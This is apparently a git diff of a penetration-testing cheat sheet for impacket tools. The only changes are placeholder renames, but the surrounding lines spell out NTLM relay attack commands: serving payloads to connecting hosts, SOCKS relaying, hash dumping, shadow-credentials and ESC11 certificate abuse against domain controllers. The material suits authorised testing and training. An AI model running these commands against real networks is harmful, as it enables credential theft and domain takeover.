@@ -13,14 +13,14 @@ impacket-smbserver <shareName> <sharePath>
 #plateform/linux #target/serve #port/445 #protocol/smb #cat/ATTACK/LISTEN-SERVE 
 
 ```
-impacket-smbserver -username <username> -password <password> <shareName> <sharePath>
+impacket-smbserver -username <username> -password <PASSWORD> <shareName> <sharePath>
 ```
 
 ## ntlmrelay - host a payload that will automatically be served to the remote host connecting option 1
 #plateform/linux #target/serve #cat/ATTACK/MITM 
 
 ```
-impacket-ntlmrelayx -tf <targets_file> -smb2support -e <payload_file|payload.exe>
+impacket-ntlmrelayx -tf <TARGETS_FILE> -smb2support -e <payload_file|payload.exe>
 ```
 
 ## ntlmrelay - host a payload that will automatically be served to the remote host connecting option 2
@@ -44,7 +44,7 @@ impacket-ntlmrelayx -t <target> -socks -smb2support
 ## ntlmrelay - socks option 2
 #plateform/linux #target/serve #cat/ATTACK/MITM 
 ```
-impacket-ntlmrelayx -tf <targets_file> -socks -smb2support
+impacket-ntlmrelayx -tf <TARGETS_FILE> -socks -smb2support
 ```
 
 ## ntlmrelay - authenticate and dump hash option 1
@@ -56,7 +56,7 @@ impacket-ntlmrelayx -t <target> -smb2support
 ## ntlmrelay - authenticate and dump hash option 2
 #plateform/linux #target/serve #cat/ATTACK/MITM 
 ```
-impacket-ntlmrelayx -tf <targets_file> -smb2support
+impacket-ntlmrelayx -tf <TARGETS_FILE> -smb2support
 ```
 
 ## ntlmrelay - to use with mitm6 - relay to target
@@ -95,5 +95,5 @@ impacket-ntlmrelayx -t ldap://<dc02> --shadow-credentials --shadow-target '<dc01
 
 ## ntlmrelay - ESC11 
 ```
-impacket-ntlmrelayx -t rpc://$PKI.<domain> -rpc-mode ICPR -icpr-ca-name <CA_NAME> -smb2support --template '<Template name>'
+impacket-ntlmrelayx -t rpc://$PKI.<DOMAIN> -rpc-mode ICPR -icpr-ca-name <CA_NAME> -smb2support --template '<Template name>'
 ```
